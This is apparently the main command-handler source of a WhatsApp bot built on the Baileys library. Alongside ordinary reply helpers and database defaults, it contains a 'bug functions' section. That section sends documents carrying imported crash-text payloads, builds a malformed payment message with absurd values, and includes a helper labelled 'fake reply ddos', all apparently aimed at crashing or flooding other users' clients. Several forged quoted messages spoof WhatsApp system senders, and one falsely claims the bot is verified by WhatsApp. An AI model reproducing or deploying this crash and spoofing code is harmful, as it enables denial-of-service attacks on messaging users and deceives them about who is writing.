require('./settings')
require('./lib/listmenu')
const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys')
const JsConfuser = require('js-confuser')
const { js, css, html, js_beautify, css_beautify, html_beautify } = require ("js-beautify")
const { jadibot, conns } = require("./jadibot")
const { jadibots, connss } = require("./jadibots")
//*const { jadibot, stopjadibot, listjadibot } = require('./clonebot/jadibot')//*
const BodyForm = require('form-data');
const { fromBuffer } = require('file-type');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const { download } = require('aptoide-scraper');
const scp2 = require('./lib/scraper2') 
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js')
const pkg = require('imgur')
const { ImgurClient } = pkg
const uploadImage = require('./lib/uploadImage')
const alightScrape = require('./lib/scraper/alightmotion');
const lyrics = require('./lib/scraper/lyrics');
const { wallpaper, wikimedia, happymod, ringtone, umma, githubstalk, npmstalk, mlstalk } = require('./lib/scraper/scraper');
const PlayStore = require('./lib/scraper/playstore');
const BukaLapak = require('./lib/scraper/bukalapak');
const { tiktokSearchVideo, tiktokDownloaderVideo } = require('./lib/scraper/tiktok');
const scrapeSoundCloud = require('./lib/scraper/soundcloud');
const { 
getRegisteredRandomId, 
addRegisteredUser, 
createSerial, 
checkRegisteredUser 
} = require('./lib/register.js')
const client = new ImgurClient({ clientId: "a0113354926015a" })
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./lib/myfunc')
const { xeon_antispam } = require('./lib/antispam')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//store
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list')
//data
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
//media
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonsticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonimage.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/xeonvideo.json'))
const DocXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./XeonMedia/database/apk.json'))

//bug database
const { xeontext1 } = require('./src/data/function/XBug/xeontext1')
const { xeontext2 } = require('./src/data/function/XBug/xeontext2')
const { xeontext3 } = require('./src/data/function/XBug/xeontext3')
const { xeontext4 } = require('./src/data/function/XBug/xeontext4')
const { xeontext5 } = require('./src/data/function/XBug/xeontext5')
const { xeontext6 } = require('./src/data/function/XBug/xeontext6')
const wkwk = fs.readFileSync(`./src/data/function/XBug/x.mp3`)
const xsteek = fs.readFileSync(`./src/data/function/XBug/x.webp`)

//store database
const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))

const xeonverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')	

        if(time2 < "23:59:00"){
        var xeonytimewisher = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var xeonytimewisher = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var xeonytimewisher = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var xeonytimewisher = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var xeonytimewisher = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var xeonytimewisher = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var xeonytimewisher = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
   
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = Yasam = async (Yasam, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
       var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix)
        //prefix2 and command2 particulary for auto download
        const prefix2 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
        const isCmd2 = body.startsWith(prefix2)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await Yasam.decodeJid(Yasam.user.id)
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const isRegistered = checkRegisteredUser(m.sender)
        const isBan = banned.includes(m.sender)
        const xeonymisc = (m.quoted || m)
        const quoted = (xeonymisc.mtype == 'buttonsMessage') ? xeonymisc[Object.keys(xeonymisc)[1]] : (xeonymisc.mtype == 'templateMessage') ? xeonymisc.hydratedTemplate[Object.keys(xeonymisc.hydratedTemplate)[1]] : (xeonymisc.mtype == 'product') ? xeonymisc[Object.keys(xeonymisc)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const xeonybody = body.startsWith(pric)
        const isCommand = xeonybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await Yasam.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isXeonMedia = m.mtype
        //user status
        const isUser = xeonverifieduser.includes(sender)
        const YasamCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= YasamCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(Yasam, m, premium)
        
 //bug functions
const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};
async function sendButton(chat, judul, teks, button, m) {
			let msg = generateWAMessageFromContent(chat, {
				viewOnceMessage: {
					message: {
						'messageContextInfo': {
							'deviceListMetadata': {},
							'deviceListMetadataVersion': 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.create({
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 1, 
								isForwarded: true, 
								forwardedNewsletterMessageInfo: {
									newsletterJid: '',
									newsletterName: '',
									serverMessageId: -1
								},
								businessMessageForwardInfo: { 
									businessOwnerJid: Yasam.decodeJid(Yasam.user.id) 
								},
							},
							body: proto.Message.InteractiveMessage.Body.create({
								text: teks
							}),
							footer: proto.Message.InteractiveMessage.Footer.create({
								text: botName
							}),
							header: proto.Message.InteractiveMessage.Header.create({
								title: judul,
								subtitle: ownerName,
								hasMediaAttachment: false
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
								buttons: button,
							})
						})
					}
				}
			}, { 
				quoted: m 
			})

			await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			})
		}
//bug functions
const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
async function XeonyCrashy(dgxeon,chat) {
Yasam.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${xeontext1}` ,
caption: `${dgxeon + xeontext1}`,
}, {quoted: subscribe_dgxeon })
}
//end bug functions

        //premium
        async function replyprem(teks) {
    replygcxeon(`This feature is for premium user, contact the owner to become premium user`)
}
        //script replier
        async function sendYasamMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Yasam.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reply
        async function replygcxeon(teks) {
            if (typereply === 'v1') {
               m.reply (teks)                
            } else if (typereply === 'v2') {
                Yasam.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,                            
                            title: xeonytimewisher,
                            body: botname,
                            previewType: "PHOTO",                                     
                            thumbnailUrl: 'https://pomf2.lain.la/f/7ijpvn4.jpg',
                        }
                    },
                    text: teks
                }, {
                    quoted: fvrif
                });                         
            } else if (typereply === 'v3') {
               Yasam.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./XeonMedia/theme/reply.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: fvrif }) 
                   } else if (typereply === 'v4') {
                Yasam.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: xeonytimewisher,
                            body: botname,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./XeonMedia/theme/reply.jpg'),     
                           sourceUrl: wagc                        
                        }
                    },
                    text: teks
                }, {
                    quoted: fvrif
               });               
              } else if (typereply === 'v5') {
                replygcxeon2(teks) 
            } else if (typereply === 'v6') {
                replysam(teks)
     } else if (typereply === 'v7') {
                reply(teks)       
            } else if (typereply === 'v8') {
  Yasam.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: "https://files.catbox.moe/d474kx.jpg", title: "｢ ACCESS ACCEPTED ｣", body: "© Powered By "+botname, previewType: "PHOTO"}}}, {quoted: fvrif})
            } else if (typereply === 'v9') {
Yasam.sendMessage(m.chat, {
                text: teks,
                contextInfo: {
                    externalAdReply: {
                        title: xeonytimewisher,
                        body: botname,
                        thumbnailUrl: "https://pomf2.lain.la/f/wze7u0je.jpg",
                        sourceUrl: "",
                        mediaType: 0,
                        showAdAttribution: true,
                        renderLargerThumbnail: true
                    }
                }
            }, {quoted: fvrif})
                        } else if (typereply === 'v10') {
                        	replygcxeon(teks)                                        
                  } else if (typereply === 'v11') {
                 Yasam.sendMessage(from, { text: teks, contextInfo: {
                   mentionedJid: [],
                 groupMentions: [],
                isForwarded: true,
                  forwardedNewsletterMessageInfo: {                 
               newsletterName: "🕊️ Giveaway (^^)/~~~",
                  serverMessageId: -1
            },
            forwardingScore: 256,
           externalAdReply: {
        showAdAttribution: true,
        title: `✿ おさらぎ 10.0 - ELAINA ✿`,
        body: `Sewa? Chat Owner :3`,
        thumbnailUrl: `https://files.catbox.moe/sri4cd.jpg`,
        sourceUrl: "https://wa.me/6283152094406",
        mediaType: 1,
        renderLargerThumbnail: false
          }
        }}, { quoted: fstatus })}                                                  
                
        }        
                        //fake reply ddos v10
            async function replygcxeonl (teks) {
let Messagedoc = {
document: fs.readFileSync(`./lib/jomok.js`),
fileName : `vetus ligna quae mortui sunt🍒`,
caption: teks,
mimetype: 'application/pdf',
headerType: 9,
contextInfo:{externalAdReply:{
title: `𝘿𝙖𝙧𝙠404𝙭𝘿𝙙𝙤𝙨`,
body: 'https://kyuurzy.my.id', 
showAdAttribution: true,
thumbnail: menunya,
mediaType: 4,
"MediaUrl":"KyuuRzy",
"sourceUrl":"KyuuRzy"
}}
}
Yasam.sendMessage(m.chat, Messagedoc, {quoted: fvrif})
}
            //fake replysam
const replysam = (teks) => {
Yasam.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 100,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${botname}`,
"body": `${xeonytimewisher} ${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://telegra.ph/file/8b0ee918ab719b42b7ce7.jpg',
"sourceUrl": 'https://chat.whatsapp.com/Ktfr9UasGoFKpq0qPoCh1c'}}},
{ quoted: fvrif})
}

const reply = (teks) => {
Yasam.sendMessage(from, { text: teks }, { quoted : fvrif })
}  
                    //fake reply with channel link embedded
async function replygcxeon2(txt) {
const xeonnewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "Elaina_Multi Divice",
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnail: fs.readFileSync('./XeonMedia/theme/reply.jpg'),                   
sourceUrl: websitex
},
},
text: txt,
}
return Yasam.sendMessage(from, xeonnewrep, {
quoted: fvrif,
})
}
            
            //Fake quoted                
            const fvrif = {
  key: {
fromMe: false,
participant: "0@s.whatsapp.net",
...(m.chat ? { remoteJid: `0@s.whatsapp.net` } : {}),
  },
  message: {
extendedTextMessage: {
  text: "_Yasam Terverifikasi Oleh WhatsApp_",
  title: `Hmm`,
  jpgThumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
}}};
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: `0@s.whatsapp.net`,  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOg2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted 
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
        //database
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 50
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = Yasam.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: `${isPremium ? 'Premium' : 'User'}`,
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: Yasam.getName(sender),
               premium: `${isPremium ? 'true' : 'false'}`,
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = true
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: true,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = true
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: Yasam.getName(botNumber), alias: botname}, owner: { nick: Yasam.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: true,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
